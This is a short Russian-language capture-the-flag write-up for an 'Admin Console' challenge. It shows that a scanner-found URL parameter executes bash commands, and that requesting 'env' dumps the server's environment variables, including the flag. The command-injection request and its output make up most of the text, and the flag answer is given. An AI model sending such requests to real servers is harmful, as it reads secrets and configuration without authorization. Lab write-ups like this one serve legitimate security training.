# Admin Console \#1

Сервис представляет из себя примитивную веб-страничку с тектовым полем и приглашением ввести команду. Но при этом нет ни одного варианта куда ее вводить

Необходимо было пройтись любым автоматическим сканером на поиск путей и обнаружить, что по адресу https://admin.vrnctf.ru/?get={command} можно исполнять bash команды на сервисе  

Выполнить https://admin.vrnctf.ru/?get=env и получить список всех переменных окружения
```bash
KUBERNETES_PORT=tcp://10.96.128.1:443
KUBERNETES_SERVICE_PORT=443
HOSTNAME=admin-console-66dd88775f-mhbkz
PYTHON_PIP_VERSION=22.0.4
HOME=/home/webadmin
GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568
ADMIN_CONSOLE_PORT_5000_TCP_ADDR=10.96.250.184
WERKZEUG_SERVER_FD=4
ADMIN_CONSOLE_PORT_5000_TCP_PORT=5000
ADMIN_CONSOLE_PORT_5000_TCP_PROTO=tcp
ADMIN_CONSOLE_SERVICE_PORT_HTTP=5000
PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/d5cb0afaf23b8520f1bbcfed521017b4a95f5c01/public/get-pip.py
WERKZEUG_RUN_MAIN=true
KUBERNETES_PORT_443_TCP_ADDR=10.96.128.1
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
ADMIN_CONSOLE_SERVICE_HOST=10.96.250.184
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
ADMIN_CONSOLE_PORT_5000_TCP=tcp://10.96.250.184:5000
LANG=C.UTF-8
PYTHON_VERSION=3.9.16
PYTHON_SETUPTOOLS_VERSION=58.1.0
ADMIN_CONSOLE_SERVICE_PORT=5000
ADMIN_CONSOLE_PORT=tcp://10.96.250.184:5000
KUBERNETES_PORT_443_TCP=tcp://10.96.128.1:443
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_HOST=10.96.128.1
PWD=/usr/src/app
PYTHON_GET_PIP_SHA256=394be00f13fa1b9aaa47e911bdb59a09c3b2986472130f30aa0bfaf7f3980637
FLAG=vrnctf{000h_3nv_m4573r_53mp44441}
```

Одна из переменных - флаг